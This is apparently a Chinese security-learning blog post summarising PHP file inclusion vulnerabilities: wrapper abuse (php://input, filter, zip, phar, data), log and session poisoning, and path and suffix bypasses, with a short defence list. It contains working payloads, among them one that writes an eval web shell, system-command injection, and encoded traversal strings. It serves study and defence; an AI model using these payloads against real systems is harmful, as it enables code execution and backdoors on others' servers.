---
title: php文件包含小结
date: 2018-02-07 11:45:50
tags:
 - php-sec
---
# 知识储备
## 概述
通过php函数引入文件时，`传入的文件名没有经过合理的验证`，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。

## php文件包含函数
>include或require语句，可以将非php文件解析为php文件来执行。

include 和 require 语句是相同的，除了错误处理方面：
 - `include()` 只生成警告（E_WARNING），并且脚本会继续
 - `require()` 会生成致命错误（E_COMPILE_ERROR）并停止脚本
 - `include_once()` `require_once()` 如果文件已被包含，则不会包含，特性同上

其实他们的不同点还有挺多的，不过跟文章讨论点不同，想知道可以去`google`下

## 文件包含分类
 - 本地文件包含LFI(Local File Include)
 - 远程文件包含RFI(Remote File Include)

## 环境说明
 - `allow_url_fopen=On`(默认为`On`) 规定是否允许从远程服务器或者网站检索数据
 - `allow_url_include=On`(php5.2之后默认为`Off`) 规定是否允许include/require远程文件

<br>
<br>

# 包含姿势
测试代码
```php
include $_GET["file"];
```

<br>

## php伪协议
> PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

[php伪协议官方文档](http://cn2.php.net/manual/zh/wrappers.file.php)

### php://input
php://input可以获取POST的数据流。当它与包含函数结合时，php://input流会被当作`php`文件执行。从而导致`任意代码执行`。

**php.ini要求：**
 - `allow_url_fopen=Off/On`
 - `allow_url_include=On`

**实例**
```
?file=php://input
[POST DATA] <?php phpinfo(); ?>

页面中会显示phpinfo信息
```
**利用实例**

|     简介     |                           POST DATA                           |
|:------------ |:------------------------------------------------------------- |
| 增加一句话   | `<?php fputs(fopen("shell.php","a"),"<?php phpinfo();?>") ?>` |
| 增加文件     | `<?php fputs(fopen("shell.php","w"),"<?php phpinfo();?>") ?>` |
| 执行系统命令 | `<?php system('ipconfig') ?>`                                 |

**注意**
在尝试的时候发现了一个问题，当写入`<?php fputs(fopen("shells.php","w"),"<?php eval($_GET[a]) ?>")  ?>`时，`$_GET[a]`会被执行(其他一样)，如果在url中没有a参数，则写入的内容会是`<?php eval() ?>`，后来想到一种方式，既然`$_GET[a]`会被执行，那么我就在构造一个a参数，如下
```
http://localhost:8088/shell.php?file=php://input&a=$_POST[a]
[POST DATA]
<?php fputs(fopen("shells.php","w"),"<?php eval($_GET[a]) ?>")  ?>

最终写入的结果会是 <?php eval($_POST[a]) ?>
```


<br>

### php://filter
php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作`php`文件执行。所以我们一般对其进行编码，让其不执行。从而导致 `任意文件读取`。

**php.ini要求：**
 - `allow_url_fopen=Off/On`
 - `allow_url_include=Off/On`

**实例**
```
?file=php://filter/read=convert.base64-encode/resource=phpinfo.php

页面中会显示经过 BASE64 编码的字符串，解码后可以得到 phpinfo.php 的源码
```

<br>

### zip://
zip://可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作`php`文件执行。从而实现`任意代码执行`。

**php.ini要求：**
 - `allow_url_fopen=Off/On`
 - `allow_url_include=Off/On`
 - `php版本 >= 5.2`

**语法**
`zip://[压缩包绝对路径]#[压缩包内文件]`

**实例**
```
?file=zip://D:\zip.jpg%23phpinfo.txt

phpinfo.txt文件会被当作PHP文件执行。
```
**注意**
 - 只需要是zip的压缩包即可，后缀名可以任意更改。
 - 压缩包路径必须是绝对路径
 - %23是因为get请求如果不把#进行url编码，#后面的参数会被忽略

相同的类型的还有zlib://和bzip2://

**问题遗留和记录**
 - 经过测试`5.2.17`中可以实现zip
 - `5.3.29-nts`版本用相对路径也能实现（无聊试了一下还真可以），`5.2.17`和`5.4.45`均不可以，有趣的现象




<br>

### phar://
phar://有点类似zip://同样可以导致 `任意代码执行`。

**php.ini要求：**
 - `allow_url_fopen=Off/On`
 - `allow_url_include=Off/On`
 - `php版本 >= 5.3`

**实例**
```
?file=phar://zip.jpg/phpinfo.txt
?file=phar://D:\zip.jpg/phpinfo.txt

phpinfo.txt文件会被当作PHP文件执行。
```
**注意**
 - 压缩包可以是zip或者phar的压缩包，后缀名可以任意更改(rar，z7，bz2均无效)
 - phar://中相对路径和绝对路径都可以使用

<br>

### data://
data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作`php`文件执行。从而导致 `任意代码执行`。

**php.ini要求：**
 - `allow_url_fopen=On`
 - `allow_url_include=On`
 - `php版本 >= 5.2`

**实例**
```
?file=data://text/plain,<?php phpinfo();
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
?file=data:text/plain,<?php phpinfo();
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

以上用法，代码都会被执行
```
<br>
<br>

## 包含日志文件
例如WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。

**利用条件**
 - **对日志文件可读**
 - **知道日志文件存储目录**

**注意**
 - 一般情况下日志存储目录会被修改，需要读取服务器配置文件(`httpd.conf`,`nginx.conf`.....)或者根据`phpinfo()`中的信息来得知
 - 日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式，还是比较灵活的。

<br>

### 默认存储路径

**apache**
 - `/var/log/httpd/`
 - `/var/log/apache2/`
 - `/etc/httpd/logs/`
 - 文件名为`error.log`(错误日志)和`access.log`(访问日志)
 - 一些资料上面说文件格式是 `error_log` ，不过自己搭建起来不是这样的，需要注意一下。

**nginx**
 - `/var/log/nginx`
 - 与安装nginx的路径相对，例如安装在`/usr/local/nginx`，那么日志在`/usr/local/nginx/logs`
 - 文件名为`error.log`(错误日志)和`access.log`(访问日志)

**SSH log**
 - `/etc/log`
 - `/var/log`
 - 文件名为`auth.log`


### apache日志实例
利用apache在页面报错时，会将报错信息记录到error.log文件中。

```
请求包内容
GET /<?php phpinfo() ?> HTTP/1.1
Host: localhost:8088

日志记录
[Sun Feb 11 11:42:26.382912 2018] [core:error] [pid 9988:tid 4140] (20024)The given path is misformatted or contained invalid characters: [client 127.0.0.1:11140] AH00127: Cannot map GET /%3C?php%20phpinfo()%20?%3E HTTP/1.1 to file
[Sun Feb 11 11:43:07.778390 2018] [core:error] [pid 9988:tid 4140] (20024)The given path is misformatted or contained invalid characters: [client 127.0.0.1:11149] AH00127: Cannot map GET /<?php phpinfo() ?> HTTP/1.1 to file

第一条日志是直接通过浏览器发送的，所以路径经过了URL编码，记录的也是URL编码。即使被包含了也无效
第二条日志是用Burp发送

包含文件(我用phpstudy所以路径是这样的)
?file=H:\phpStudy\PHPTutorial\Apache\logs\error.log

界面出现日志信息，和phpinfo()被执行。
```

### SSH log实例
利用ssh到系统上时会记录日志到 auth.log 文件中。

```
X-Shell命令
[c:\~]$ ssh '<?php phpinfo() ?>'@192.168.136.153

日志记录
Feb 11 16:08:53 byxs-virtual-machine sshd[5985]: Failed password for invalid user '<?php phpinfo() ?>' from 192.168.136.1 port 15461 ssh2

包含文件(ubuntu16.04)
?file=/var/log/auth.log

界面出现日志信息，和phpinfo()被执行。
```

<br>

## 包含/pros/self/environ

**利用条件**
>php以cgi方式运行，这样environ才会保持UA头。
environ文件存储位置已知，且environ文件可读。

**操作**

>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。


还可以包含/pros/self/fd/\*文件，不过还没有尝试过

## 包含Session

**利用条件**
 - 找到Session内的可控变量
 - Session文件可读写，并且知道存储路径

**默认存储路径**
 - `/tmp/`
 - `/tmp/sessions/`
 - `/var/lib/php5/`
 - `/var/lib/php/`
 - session文件格式： `sess_[your phpsessid value]`

**操作**
可以先根据尝试包含到Session文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。

## 包含临时文件
PHP上传文件的时候会生成一个临时文件，那么如果在具有竞争的条件下在删除临时文件之前就可以利用它。
由于没玩过，具体看[chybeta](https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/)里面的介绍


## 包含SMTP
同样也是通过日志来完成
[具体例子在这](https://shinpachi8.github.io/2017/02/22/lfi/#%E9%80%9A%E8%BF%87SMTP%E6%9D%A5%E5%88%A9%E7%94%A8)

## 包含xss
>(需要allow_url_fopen=On，allow_url_include=On并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -)

高端姿势，待玩


## 包含上传文件
如果有上传功能的话，美滋滋

<br><br>

# 绕过
正常情况下，一般会对传入参数做一些限制，例如固定文件名，固定前缀，固定后缀，过滤关键符号等等。

## 前缀绕过
测试代码
```
<?php
$file = $_GET["file"];
include "D:/Less-2/test/".$file;
?>
```

### 目录遍历
使用`../../`来返回上一目录，被成为目录遍历(Path Traversal)。
例如 `?file=../../phpinfo/phpinfo.php`

## 后缀绕过
测试代码
```
<?php
$file = $_GET["file"];
include $file.".php";
?>
```

### 利用URL
完整url格式：`protocol :// hostname[:port] / path / [;parameters][?query]#fragment`

#### query(?)
```
[访问参数]   ?file=http://localhost:8088/phpinfo.php?
[拼接后]     ?file=http://localhost:8088/phpinfo.php?.php

利用url中，?后面会被作为参数去解析，文件名称就变为我们想要的
```

#### fragment(#)
```
[访问参数]   ?file=http://localhost:8088/phpinfo.php%23
[拼接后]     ?file=http://localhost:8088/phpinfo.php#.php

利用url中，#后面会被作为锚点来解析，文件名称就变为我们想要的

注意GET请求中#要经过URL编码
```

### 利用协议
利用`zip://`和`phar://`，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。

#### zip://
```
[访问参数]   ?file=zip://D:\zip.jpg%23phpinfo
[拼接后]     ?file=zip://D:\zip.jpg#phpinfo.php
```

#### phar://
```
[访问参数]   ?file=phar://zip.zip/phpinfo
[拼接后]     ?file=phar://zip.zip/phpinfo.php
```

### 长度截断
利用目录字符串在系统中如果达到了最大值，会将之后的字符丢弃。
**利用条件**
 - `php<5.2.8`
 - linux下字符长度>`4096`
 - window下字符长度>`256`

```
?file=../phpinfo.php/././././././.[…]/./././././.
```

**自己没成功，记录待解决**
php版本5.2.17，会出现warning报错

### 点号截断
**利用条件**
 - `php<5.2.8`
 - window环境下，并且字符长度>`256`
```
?file=../phpinfo.php/........[…]............
```
**也没成功**

### 0字节截断
>PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(x00)将作为字符串的结束符。

**利用条件**
 - `magic_quotes_gpc=Off`
 - `php<5.3.4`

```
?file=../phpinfo.php%00
```
## ../绕过
一般情况下，如果../被过滤，可以尝试利用编码绕过。引用`chybeta大神的总结`
 - 利用url编码
   - ../
     - %2e%2e%2f
     - ..%2f
     - %2e%2e/
   - ..\
     - %2e%2e%5c
     - ..%5c
     - %2e%2e\
 - 二次编码
   - ../
%252e%252e%252f
   - ..\
     - %252e%252e%255c
 - 容器/服务器的编码方式
   - ../
     - ..%c0%af
       - 注：[Why does Directory traversal attack %C0%AF work?](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
     - %c0%ae%c0%ae/
       - 注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）
       - Apache Tomcat Directory Traversal
   - ..\
     - ..%c1%9c

<br><br>

# 防御
 - allow_url_include和allow_url_fopen最小权限化
 - 设置`open_basedir`（open_basedir 将php所能打开的文件限制在指定的目录树中）
 - 白名单限制包含文件，或者严格过滤`./\`

<br>

# 总结
以上记录了自己在学习PHP文件包含的实验过程和自己的理解，里面也摘录了一些大牛漂亮的总结。真心感谢师傅们的经验和总结。
以及自己给自己出了一些练习题目，方便自己以后回忆。
[php-file-include](https://github.com/byxs0x0/php-file-include)（待完成）

# 参照
[chybeta-php文件包含漏洞](https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/)
[php文件包含漏洞利用总结](http://vinc.top/2016/08/25/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/)
[常见文件包含发生场景与防御](https://www.anquanke.com/post/id/86123)
[本地文件包含漏洞&&PHP利用协议&&实践源码](https://github.com/Go0s/LFIboomCTF) 推荐去练习一下
[php伪协议实现命令执行的七种姿势](http://www.freebuf.com/column/148886.html)
[PHP伪协议分析与应用](http://www.4o4notfound.org/index.php/archives/31/)
